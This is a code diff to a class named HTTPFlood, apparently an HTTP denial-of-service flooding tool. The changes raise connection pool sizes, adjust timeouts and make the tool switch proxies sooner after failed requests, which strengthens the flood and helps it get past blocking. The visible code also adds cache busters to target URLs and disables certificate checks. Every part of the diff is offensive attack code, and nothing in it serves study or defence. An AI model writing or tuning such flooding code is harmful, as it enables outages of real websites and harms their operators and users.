@@ -335,8 +335,8 @@ class HTTPFlood:
         session.verify = False
         
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=30,
-            pool_maxsize=100,
+            pool_connections=50,
+            pool_maxsize=200,
             max_retries=0,
             pool_block=False
         )
@@ -373,7 +373,7 @@ class HTTPFlood:
                 
                 target_url = add_cache_buster(target_url)
                 
-                timeout = 1
+                timeout = 2
                 
                 if self.method == 'GET':
                     response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)
@@ -408,7 +408,7 @@ class HTTPFlood:
                 update_stats(success=False)
                 consecutive_fails += 1
                 
-                if consecutive_fails >= 5 and self.use_proxy_rotation:
+                if consecutive_fails >= 3 and self.use_proxy_rotation:
                     try:
                         current_proxy_index = (current_proxy_index + 1) % len(config.proxies)
                         proxy = config.proxies[current_proxy_index]
